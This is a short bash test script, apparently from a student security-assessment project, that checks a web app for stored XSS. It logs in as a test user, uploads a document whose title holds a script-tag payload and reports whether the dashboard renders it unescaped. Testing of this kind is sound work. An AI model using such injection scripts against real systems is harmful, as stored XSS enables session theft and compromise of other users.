#!/usr/bin/env bash
# OWASP A03:2021 Injection - XSS almacenado por el titulo del documento
source "$(dirname "$0")/lib.sh" "$@"

jar="$(login bob bob123)"
payload='<script>alert("XSS-TCC")</script> Evidencia'
tmp="$EVIDENCE_DIR/02-payload.txt"
printf 'documento de prueba para XSS almacenado\n' > "$tmp"

code=$(curl_ -b "$jar" -o /dev/null -w '%{http_code}' -X POST "$target/docs" \
    --form-string "title=$payload" -F "file=@$tmp;type=text/plain;filename=xss-proof.txt")
say "POST /docs con titulo malicioso -> HTTP $code"

out="$EVIDENCE_DIR/02-dashboard.html"
curl_ -b "$jar" -o "$out" "$target/dashboard"

if grep -q '<script>alert' "$out"; then
    say "ATAQUE EXITOSO: el titulo se renderiza como HTML crudo (XSS almacenado)"
    say "evidence=$out"
    exit 0
fi
say "BLOQUEADO: el titulo sale escapado (&lt;script&gt;)"
say "evidence=$out"
exit 1
